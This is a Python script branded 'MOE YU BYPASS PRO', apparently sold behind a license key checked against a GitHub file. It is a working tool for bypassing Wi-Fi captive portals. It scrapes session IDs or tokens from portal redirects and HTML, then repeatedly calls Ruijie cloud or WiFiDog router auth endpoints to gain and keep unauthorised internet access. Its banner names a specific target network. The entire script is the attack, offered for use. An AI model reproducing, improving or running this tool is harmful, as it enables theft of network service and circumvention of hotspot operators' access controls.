import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import subprocess
import os
import uuid
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# Cloud Portal အတွက် Connection pool ပြည့်မသွားစေရန် thread အရေအတွက်ကို လျှော့ထားသည်
PING_THREADS = 2 
PING_INTERVAL = 1.0 

# COLOR SYSTEM
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# GitHub License Database
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    """Device ID (HWID) ကို စစ်ဆေးခြင်း"""
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def get_current_gateway():
    """လက်ရှိချိတ်ထားသော Router IP ကို ရှာဖွေခြင်း"""
    try:
        gateway = subprocess.check_output("ip route show | grep default | awk '{print $3}'", shell=True).decode().strip()
        return gateway if gateway else "192.168.110.1"
    except:
        return "192.168.110.1"

def check_license():
    """License key နှင့် သက်တမ်းကို စစ်ဆေးခြင်း"""
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
    
    try: user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    except: sys.exit()
    if not user_key: sys.exit()
    
    try:
        res = requests.get(URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                # Key မှန်ကန်ပါက Bypass process စတင်မည်
                return True
        console.print("\n[bold red]❌ INVALID KEY![/bold red]")
        sys.exit()
    except:
        console.print("\n[bold red]📡 CONNECTION ERROR![/bold red]")
        sys.exit()

# ===============================
# BYPASS ENGINE (HYBRID MODE)
# ===============================
def start_bypass_process():
    while not stop_event.is_set():
        try:
            session = requests.Session()
            # Redirect နောက်ဆုံးထိလိုက်ပြီး URL ကို ဖမ်းမည်
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            portal_url = r.url
            r1 = session.get(portal_url, timeout=10, verify=False)
            
            # --- IMPROVED PARSING (Cloud & Local) ---
            params = parse_qs(urlparse(portal_url).query)
            
            # sessionId အပါအဝင် အခြား key နာမည်များကို ရှာဖွေခြင်း
            sid = (params.get('sessionId') or 
                   params.get('session_id') or 
                   params.get('token') or 
                   params.get('auth_id') or 
                   [None])[0]
            
            # URL ထဲတွင် မတွေ့ပါက HTML ထဲတွင် Regex ဖြင့် ထပ်ရှာမည်
            if not sid:
                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                current_gw = get_current_gateway()
                
                # Ruijie Cloud Portal အတွက် Logic
                if "ruijienetworks.com" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode_label = "RUIJIE-CLOUD"
                else:
                    auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                    mode_label = "LOCAL-ROUTER"
                
                def pulse_ping():
                    while not stop_event.is_set():
                        try:
                            # Gateway သို့ Request ပို့ပြီး Session အရှင်ထားခြင်း
                            session.get(auth_link, timeout=7)
                            sys.stdout.write(f"{GREEN}[✓] {mode_label} | SID: {sid[:12]}.. | ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(PING_INTERVAL)

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_ping, daemon=True).start()
                
                # အင်တာနက် အခြေအနေကို ၁၅ စက္ကန့်တစ်ခါ စစ်ဆေးမည်
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(15)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                time.sleep(3)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    if check_license():
        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO v7.8 ACTIVATED 🔥[/bold white]"), 
                            subtitle="[bold yellow]Target: Cham Myae Thaw Tar & Others[/bold yellow]",
                            border_style="bold red", expand=False))
        try: start_bypass_process()
        except KeyboardInterrupt: sys.exit()
